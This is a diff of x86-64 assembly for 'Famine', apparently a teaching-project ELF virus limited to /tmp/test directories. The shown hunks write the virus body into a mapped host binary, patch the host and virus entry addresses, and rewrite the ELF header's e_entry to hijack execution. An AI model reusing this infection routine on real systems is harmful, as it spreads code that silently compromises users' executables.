@@ -7,9 +7,6 @@ section .text
     dir db              "[+] dir",10,0  ;9
 
     global _start
-    _host:
-        mov rax, SC_EXIT
-        syscall
 
     _start:
         PUSH_ALL
@@ -299,30 +296,32 @@ section .text
                     mov qword [rax+Elf64_Phdr.p_align], 0x1000     ; p_align = 0x1000 (4KB)
 
                 .write_payload:
-                   mov rsi, VAR(Famine.virus_entry)
-                   mov rdi, VAR(Famine.mmap_ptr)
-                   add rdi, VAR(Famine.virus_offset)
+                    mov rsi, VAR(Famine.virus_entry)
+                    mov rdi, VAR(Famine.mmap_ptr)
+                    add rdi, VAR(Famine.virus_offset)
 
-                   push rdi                        
+                    ; nos guardamos el address del mmap que se corresponde con el principio
+                    ; del virus, movsb modifica este valor.
+                    push rdi
 
-                   mov ecx, dword VAR(Famine.virus_size)
-                   cld
-                   rep movsb
+                    mov ecx, dword VAR(Famine.virus_size)
+                    cld
+                    rep movsb
 
-                   pop rdi                       
+                    pop rdi
 
-                   ; Patch host_entry en el mmap
-                   mov rax, VAR(Famine.original_entry)
-                   mov [rdi + (host_entry - _start)], rax
+                    ; Patch host_entrypoint en el mmap con el entrypoint original
+                    mov rax, VAR(Famine.original_entry)
+                    mov [rdi + (host_entrypoint - _start)], rax
 
-                   ; Patch virus_vaddr en el mmap
-                   mov rax, VAR(Famine.new_entry)
-                   mov [rdi + (virus_vaddr - _start)], rax
+                    ; Patch virus_vaddr en el mmap con el nuevo entrypoint
+                    mov rax, VAR(Famine.new_entry)
+                    mov [rdi + (virus_vaddr - _start)], rax
 
-                   ; Cambiar e_entry en el ELF Header
-                   mov rax, VAR(Famine.mmap_ptr)
-                   mov rbx, VAR(Famine.new_entry)
-                   mov [rax + Elf64_Ehdr.e_entry], rbx
+                    ; Cambiar e_entry en el ELF Header
+                    mov rax, VAR(Famine.mmap_ptr)
+                    mov rbx, VAR(Famine.new_entry)
+                    mov [rax + Elf64_Ehdr.e_entry], rbx
 
                 .munmap:
                     ;munmap(map_ptr, )
@@ -361,7 +360,7 @@ section .text
             cmp byte [rdi], 0   ; find double null
             jnz .open_dir
 
-        .jump:
+        .jump_to_host:
             mov rsp, rbp
             add rsp, Famine_size
             pop rsp
@@ -370,18 +369,19 @@ section .text
             ; Calcular dirección de retorno
             lea rax, [rel _start]        ; Dirección absoluta de _start ahora mismo
             sub rax, [rel virus_vaddr]   ; Base real (Absoluta - Virtual)
-            add rax, [rel host_entry]    ; Dirección host (Base + Offset)
+            add rax, [rel host_entrypoint]    ; Dirección host (Base + Offset)
 
             jmp rax
 
         .exit:
-            pop rsp
+        _dummy_host_entrypoint:
             mov rax, SC_EXIT
+            xor rdi, rdi
             syscall
-    
+
         dirs db         "/tmp/test",0,"/tmp/test2",0,0
-        Traza db         "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+        Traza db         "tomartin & carce-bo"
         hello db            "[+] Hello",10,0  ;11
-        host_entry  dq   _host
-        virus_vaddr dq   _start  
+        host_entrypoint  dq   _dummy_host_entrypoint
+        virus_vaddr dq   _start
     _finish:
